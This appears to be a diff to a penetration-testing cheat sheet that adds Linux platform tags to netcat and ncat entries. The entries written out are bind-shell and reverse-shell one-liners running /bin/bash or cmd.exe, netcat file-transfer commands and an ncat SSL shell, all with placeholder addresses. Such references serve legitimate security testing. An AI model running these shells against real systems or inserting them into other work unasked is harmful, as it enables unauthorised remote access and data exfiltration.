@@ -15,6 +15,7 @@ nc -nlvp <port> -e cmd.exe
 ```
 
 ## nc bind shell linux
+#plateform/linux
 ```
 nc -nlvp <port> -e /bin/bash
 ```
@@ -26,19 +27,19 @@ nc -nv <ip> <port> -e cmd.exe
 ```
 
 ## nc reverse shell linux
-#cat/ATTACK/REVERSE_SHELL 
+#plateform/linux #cat/ATTACK/REVERSE_SHELL 
 ```
 nc -nv <ip> <port> -e /bin/bash
 ```
 
 ## nc transfert file - receiver
-#cat/ATTACK/FILE_TRANSFERT 
+#plateform/linux #cat/ATTACK/FILE_TRANSFERT 
 ```
 nc -nlvp <port> > <incomming_file>
 ```
 
 ## nc transfert file - sender
-#cat/ATTACK/FILE_TRANSFERT 
+#plateform/linux #cat/ATTACK/FILE_TRANSFERT 
 ```
 nc -nv <ip> <port> < <file_to_send>
 ```
@@ -48,19 +49,19 @@ nc -nv <ip> <port> < <file_to_send>
 % ncat
 
 ## ncat bind shell ssl filtered
-#cat/ATTACK/LISTEN-SERVE 
+#plateform/linux #cat/ATTACK/LISTEN-SERVE 
 ```
 ncat --exec cmd.exe --allow <allowed_ip> -vnl <port> --ssl
 ```
 
 ## ncat bind shell ssl connection
-#cat/ATTACK/LISTEN-SERVE 
+#plateform/linux #cat/ATTACK/LISTEN-SERVE 
 ```
 ncat -v <ip> <port> --ssl
 ```
 
 ## ncat HTTP WEB proxy
-#cat/ATTACK/LISTEN-SERVE 
+#plateform/linux #cat/ATTACK/LISTEN-SERVE 
 ```
 ncat --listen --proxy-type http <port>
 ```
